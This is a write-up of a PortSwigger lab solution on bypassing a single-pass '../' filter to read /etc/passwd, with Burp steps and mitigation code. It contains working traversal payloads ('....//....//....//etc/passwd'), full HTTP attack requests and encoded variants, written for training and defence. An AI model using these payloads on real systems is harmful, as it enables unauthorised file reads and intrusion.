# 📘 PortSwigger Lab: File Path Traversal, Traversal Sequences Stripped Non-Recursively

<a id="top"></a>

> 🔗 Official Lab: https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively  
> 🎯 Topic: Path Traversal — bypassing incomplete traversal-sequence filtering  
> 🧪 Difficulty: Practitioner  
> ✅ Status: Solved  

---

## 📑 Contents

- [🎯 Goal](#goal)
- [🧠 Short Theory](#theory)
- [🧩 Core Idea](#idea)
- [📁 What Is Path Traversal](#path-traversal)
- [🧹 What Non-Recursive Stripping Means](#non-recursive)
- [🔬 How the Working Payload Is Built](#payload-building)
- [🗂 How the Application Loads Images](#images)
- [❌ Vulnerable Filtering Logic](#vulnerable-flow)
- [🔍 Step 1 — Find the Image Request](#step1)
- [🔍 Step 2 — Send the Request to Repeater](#step2)
- [🔍 Step 3 — Test Standard Traversal](#step3)
- [🔍 Step 4 — Use Nested Sequences](#step4)
- [🔍 Step 5 — Read `/etc/passwd`](#step5)
- [📨 Example Original Request](#original-request)
- [📨 Example Modified Request](#modified-request)
- [📥 Example Result](#response)
- [🧾 Complete Attack Chain](#attack-chain)
- [🔬 Why the Attack Worked](#breakdown)
- [🧭 How `....//` Becomes `../`](#transformation)
- [🐧 Why `/etc/passwd` Is Used](#passwd)
- [🧠 Pentester Mindset](#pentester)
- [🧪 Additional Tests](#additional-tests)
- [❌ Common Mistakes](#mistakes)
- [🛡 Mitigation](#defense)
- [✅ Checklist](#checklist)
- [🧾 Conclusion](#conclusion)

---

<a id="goal"></a>

## 🎯 Goal

Exploit a **File Path Traversal** vulnerability in the product image display mechanism and retrieve the contents of:

```text
/etc/passwd
```

The application removes standard traversal sequences:

```text
../
```

However, the removal is performed only once and is not reapplied to the modified string.

To bypass the filter, place the following value in the:

```text
filename
```

parameter:

```text
....//....//....//etc/passwd
```

After the application strips the nested `../` sequences once, the server is left with:

```text
../../../etc/passwd
```

---

<a id="theory"></a>

## 🧠 Short Theory

**Path Traversal** is a vulnerability that allows user input to influence the path of a file read by the server.

The application expects a normal image name:

```text
filename=58.jpg
```

The server may construct a path such as:

```text
/var/www/images/58.jpg
```

Without proper validation, an attacker may try:

```text
../../../etc/passwd
```

The sequence:

```text
../
```

moves one directory upward.

In this lab, the developer attempted to prevent the attack by removing `../` from user input. The weakness is that this filtering is **non-recursive**.

A specially crafted string creates a new traversal sequence after the first filtering pass.

---

<a id="idea"></a>

## 🧩 Core Idea

A standard payload:

```text
../../../etc/passwd
```

may be processed as follows:

```text
../../../etc/passwd
        ↓ remove ../
etc/passwd
```

The direct traversal sequences disappear.

Instead, the attack uses a nested construction:

```text
....//
```

It contains an embedded:

```text
../
```

When the filter removes only that embedded match, the remaining characters form:

```text
../
```

Therefore:

```text
....//....//....//etc/passwd
```

becomes:

```text
../../../etc/passwd
```

after a single filtering pass.

The resulting path is then interpreted by the server's file system.

---

<a id="path-traversal"></a>

## 📁 What Is Path Traversal

Path Traversal is also known as:

```text
Directory Traversal
```

or:

```text
dot-dot-slash attack
```

The primary sequence on Linux and Unix is:

```text
../
```

A Windows application may also accept:

```text
..\
```

The purpose of `../` is:

```text
move to the parent directory
```

Example starting directory:

```text
/var/www/images/
```

After one traversal:

```text
/var/www/
```

After two:

```text
/var/
```

After three:

```text
/
```

The attacker can then reference:

```text
/etc/passwd
```

The path:

```text
/var/www/images/../../../etc/passwd
```

normalizes to:

```text
/etc/passwd
```

---

<a id="non-recursive"></a>

## 🧹 What Non-Recursive Stripping Means

The phrase:

```text
traversal sequences stripped non-recursively
```

means the application removes the forbidden sequence during only one pass.

A simplified example is:

```python
filename = filename.replace("../", "")
```

For this input:

```text
../etc/passwd
```

the result is:

```text
etc/passwd
```

However, for this input:

```text
....//etc/passwd
```

removing the embedded `../` once produces:

```text
../etc/passwd
```

The application does not run the filter again, so the newly formed traversal sequence remains.

A recursive implementation might look like:

```python
while "../" in filename:
    filename = filename.replace("../", "")
```

Even recursive string removal is not a reliable defense. A secure implementation must validate the final canonical path.

---

<a id="payload-building"></a>

## 🔬 How the Working Payload Is Built

Consider one segment:

```text
....//
```

It can be viewed as overlapping characters that contain:

```text
../
```

Before filtering:

```text
....//
```

After the embedded `../` is removed once:

```text
../
```

Three such segments are used to move three directories upward:

```text
....//....//....//
```

After filtering:

```text
../../../
```

Appending the target file creates:

```text
....//....//....//etc/passwd
```

which becomes:

```text
../../../etc/passwd
```

---

<a id="images"></a>

## 🗂 How the Application Loads Images

The lab contains a vulnerability in the product image display feature.

When a user opens a product page, the browser sends a separate request for the product image.

Example:

```http
GET /image?filename=58.jpg HTTP/2
Host: LAB-ID.web-security-academy.net
```

The parameter:

```text
filename
```

tells the server which file to read.

Assume the application uses:

```text
/var/www/images/
```

For a normal value:

```text
58.jpg
```

the final path is:

```text
/var/www/images/58.jpg
```

For the malicious value after weak filtering, the final path becomes:

```text
/var/www/images/../../../etc/passwd
```

The file system normalizes this to:

```text
/etc/passwd
```

---

<a id="vulnerable-flow"></a>

## ❌ Vulnerable Filtering Logic

A simplified vulnerable implementation may look like:

```python
filename = request.args["filename"]
filename = filename.replace("../", "")
path = "/var/www/images/" + filename

return open(path, "rb").read()
```

The developer assumes that removing:

```text
../
```

prevents access outside the image directory.

However, this input:

```text
....//....//....//etc/passwd
```

becomes:

```text
../../../etc/passwd
```

after one filtering pass.

The application then concatenates it with the base directory:

```text
/var/www/images/../../../etc/passwd
```

and reads the system file.

Vulnerable flow:

```text
User-controlled filename
        ↓
Single-pass removal of ../
        ↓
New ../ sequences appear
        ↓
Concatenate with image directory
        ↓
File-system normalization
        ↓
Read /etc/passwd
```

---

<a id="step1"></a>

## 🔍 Step 1 — Find the Image Request

1. Open the lab.
2. Visit any product page.
3. Start Burp Suite.
4. Open:

```text
Proxy → HTTP history
```

5. Find the request that retrieves the product image.

It normally looks similar to:

```http
GET /image?filename=58.jpg HTTP/2
Host: LAB-ID.web-security-academy.net
```

The main test input is:

```text
filename=58.jpg
```

---

<a id="step2"></a>

## 🔍 Step 2 — Send the Request to Repeater

Right-click the request and select:

```text
Send to Repeater
```

Open the:

```text
Repeater
```

tab.

Burp Repeater allows you to:

- modify the `filename` value;
- resend the request;
- compare response status codes;
- compare response lengths;
- inspect the response body;
- verify whether a different file was returned.

---

<a id="step3"></a>

## 🔍 Step 3 — Test Standard Traversal

First, replace the image name:

```text
58.jpg
```

with the standard payload:

```text
../../../etc/passwd
```

Request:

```http
GET /image?filename=../../../etc/passwd HTTP/2
Host: LAB-ID.web-security-academy.net
```

The application removes the traversal sequences, so the standard version does not retrieve the target file.

This indicates that filtering is present, but it does not prove that the implementation is secure.

The next pentesting question is:

```text
Is the removal applied recursively?
```

---

<a id="step4"></a>

## 🔍 Step 4 — Use Nested Sequences

Replace the `filename` value with:

```text
....//....//....//etc/passwd
```

Modified request:

```http
GET /image?filename=....//....//....//etc/passwd HTTP/2
Host: LAB-ID.web-security-academy.net
```

Click:

```text
Send
```

Transformation logic:

```text
....//....//....//etc/passwd
                ↓ single-pass removal of ../
../../../etc/passwd
```

---

<a id="step5"></a>

## 🔍 Step 5 — Read `/etc/passwd`

The HTTP response now contains text from the system file instead of image data.

Typical lines include:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
```

This confirms that the server read:

```text
/etc/passwd
```

The lab is then marked:

```text
Solved
```

---

<a id="original-request"></a>

## 📨 Example Original Request

```http
GET /image?filename=58.jpg HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION-VALUE
User-Agent: Mozilla/5.0
Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8
```

The client controls:

```text
58.jpg
```

---

<a id="modified-request"></a>

## 📨 Example Modified Request

```http
GET /image?filename=....//....//....//etc/passwd HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION-VALUE
User-Agent: Mozilla/5.0
Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8
```

Critical payload:

```text
....//....//....//etc/passwd
```

URL-encoded form, if needed:

```text
....%2f%2f....%2f%2f....%2f%2fetc%2fpasswd
```

For this lab, the plain unencoded value is sufficient.

---

<a id="response"></a>

## 📥 Example Result

The response may look similar to:

```http
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
Content-Length: ...
```

Response body:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
```

The exact contents depend on the lab environment.

The important proof is:

```text
the response contains data from /etc/passwd
```

---

<a id="attack-chain"></a>

## 🧾 Complete Attack Chain

```text
1. Open the PortSwigger lab
2. Visit a product page
3. Find the /image?filename=... request in Burp HTTP history
4. Send the request to Repeater
5. Confirm that standard ../../../etc/passwd is filtered
6. Infer that ../ may be removed only once
7. Use nested ....// sequences
8. Submit ....//....//....//etc/passwd
9. Send the modified request
10. Receive the contents of /etc/passwd
11. Confirm that the lab is marked Solved
```

---

<a id="breakdown"></a>

## 🔬 Why the Attack Worked

The vulnerability resulted from several combined issues.

### 1. The User Controls the File Name

The:

```text
filename
```

parameter is supplied by the client.

### 2. The Value Is Used to Build a File Path

The server appends the user-controlled value to the image directory.

### 3. The Defense Relies on String Removal

The application tries to remove:

```text
../
```

instead of validating the final path.

### 4. Removal Happens Only Once

New traversal sequences appear after the first filtering pass.

### 5. The Final Path Is Not Validated

The application does not verify that the normalized path remains inside the image directory.

### 6. The Application Process Can Read the File

The web application has permission to read `/etc/passwd`, so its contents are returned to the client.

---

<a id="transformation"></a>

## 🧭 How `....//` Becomes `../`

Original string:

```text
....//
```

Character view:

```text
. . . . / /
```

An embedded match exists inside it:

```text
../
```

After one match is removed, the remaining characters form:

```text
../
```

For the complete payload:

```text
....//....//....//etc/passwd
```

the transformation is:

```text
....//  →  ../
....//  →  ../
....//  →  ../
```

Result:

```text
../../../etc/passwd
```

Then:

```text
/var/www/images/../../../etc/passwd
```

normalizes to:

```text
/etc/passwd
```

---

<a id="passwd"></a>

## 🐧 Why `/etc/passwd` Is Used

`/etc/passwd` is a standard Linux and Unix system file.

It contains information about local user accounts.

Line format:

```text
username:x:UID:GID:comment:home:shell
```

Example:

```text
root:x:0:0:root:/root:/bin/bash
```

Field meanings:

```text
root        username
x           password is stored elsewhere
0           UID
0           GID
root        account description
/root       home directory
/bin/bash   login shell
```

Important distinction:

```text
/etc/passwd normally does not contain password hashes
```

Modern Linux systems usually store password hashes in:

```text
/etc/shadow
```

which is restricted to privileged processes.

The lab uses `/etc/passwd` as a safe proof of arbitrary file read.

---

<a id="pentester"></a>

## 🧠 Pentester Mindset

When an application accepts a file name, test not only ordinary `../`, but also possible filter bypasses.

Useful questions include:

```text
Is ../ removed, or is the whole request rejected?
```

```text
Is filtering applied once or repeatedly?
```

```text
Does the application decode URL encoding before or after filtering?
```

```text
Are absolute paths accepted?
```

```text
Are backslashes accepted?
```

```text
Is the final canonical path validated?
```

Common parameter names:

```text
file
filename
path
document
template
page
image
download
folder
```

General testing process:

```text
1. Find a file-related parameter
2. Identify the normal value
3. Test ../
4. Analyze the filter behavior
5. Try nested traversal sequences
6. Try encoding variations
7. Compare status, body, length, and Content-Type
8. Verify the returned content
```

---

<a id="additional-tests"></a>

## 🧪 Additional Tests

Within an authorized lab, the following variants can be compared:

### Standard traversal

```text
../../../etc/passwd
```

### Nested traversal sequences

```text
....//....//....//etc/passwd
```

### URL encoding

```text
..%2f..%2f..%2fetc%2fpasswd
```

### Double URL encoding

```text
..%252f..%252f..%252fetc%252fpasswd
```

### Absolute path

```text
/etc/passwd
```

### Windows-style path

```text
..\..\..\windows\win.ini
```

The working value for this specific lab is:

```text
....//....//....//etc/passwd
```

---

<a id="mistakes"></a>

## ❌ Common Mistakes

### Mistake 1. Modifying the Product Page Request

The vulnerability is located in the separate image request:

```http
GET /image?filename=...
```

### Mistake 2. Changing the Wrong Parameter

The target parameter is:

```text
filename
```

### Mistake 3. Continuing to Use Standard `../`

Direct traversal sequences are removed by the filter.

The working bypass is:

```text
....//
```

### Mistake 4. Using Too Few Traversals

This lab requires three upward transitions:

```text
....//....//....//
```

### Mistake 5. Omitting the Target File

The complete payload is:

```text
....//....//....//etc/passwd
```

### Mistake 6. Adding an Unnecessary Leading Slash

The correct payload starts with:

```text
....//
```

not:

```text
/....//
```

### Mistake 7. Looking Only at the HTTP Status

Successful and unsuccessful requests may both return `200 OK`.

Inspect the response body.

### Mistake 8. Expecting JPEG Data

After exploitation, the server returns text from `/etc/passwd`, not an image.

### Mistake 9. Forgetting to Send the Modified Request

After editing the value, click:

```text
Send
```

### Mistake 10. Treating String Removal as a Complete Defense

Removing substrings does not replace canonical path validation.

---

<a id="defense"></a>

## 🛡 Mitigation

### 1. Do Not Accept File Paths from the User

Use an identifier instead:

```text
image_id=58
```

Resolve it server-side:

```python
allowed_images = {
    "58": "58.jpg",
    "59": "59.jpg",
}
```

### 2. Use an Allowlist

Permit only known file names.

Example:

```python
if filename not in allowed_filenames:
    reject_request()
```

### 3. Normalize the Final Path

```python
base = os.path.realpath("/var/www/images")
target = os.path.realpath(os.path.join(base, user_input))
```

### 4. Verify That the Path Remains Inside the Base Directory

```python
if not target.startswith(base + os.sep):
    reject_request()
```

### 5. Do Not Rely on `replace()`

Insufficient defense:

```python
filename = filename.replace("../", "")
```

It can be bypassed and does not handle every path representation.

### 6. Use `basename` Only as an Additional Control

```python
filename = os.path.basename(user_input)
```

This may help, but it should not be the only defense.

### 7. Apply Least Privilege

The web application process should have access only to files it actually requires.

### 8. Avoid Detailed File-System Errors

Errors should not reveal:

- absolute paths;
- internal directory structures;
- internal file names;
- stack traces.

### 9. Log Suspicious Values

Examples:

```text
../
....//
..\
%2e%2e%2f
%252e%252e%252f
```

Logging helps detect attacks, but it does not replace correct validation.

---

<a id="checklist"></a>

## ✅ Checklist

### Reconnaissance

- [ ] Opened a product page
- [ ] Started Burp Proxy
- [ ] Located the image request
- [ ] Identified the `filename` parameter
- [ ] Sent the request to Repeater

### Filter Analysis

- [ ] Tested standard `../../../etc/passwd`
- [ ] Confirmed that `../` is removed
- [ ] Suspected non-recursive filtering
- [ ] Built a nested traversal payload

### Exploitation

- [ ] Used `....//....//....//etc/passwd`
- [ ] Sent the modified request
- [ ] Received lines from `/etc/passwd`
- [ ] Confirmed arbitrary file read
- [ ] Confirmed the lab status is Solved

---

<a id="conclusion"></a>

## 🧾 Conclusion

The application attempted to prevent Path Traversal by removing:

```text
../
```

However, the filtering was performed only once.

The payload:

```text
....//....//....//etc/passwd
```

became:

```text
../../../etc/passwd
```

after one filtering pass.

This allowed the request to escape the image directory and retrieve:

```text
/etc/passwd
```

Main lessons:

```text
Removing a dangerous substring is not a reliable security control.
```

```text
Filters must be tested for newly formed dangerous sequences.
```

```text
Security should rely on normalization and validation of the final path.
```

```text
The normalized path must remain inside the approved base directory.
```

---

[⬆ Back to top](#top)

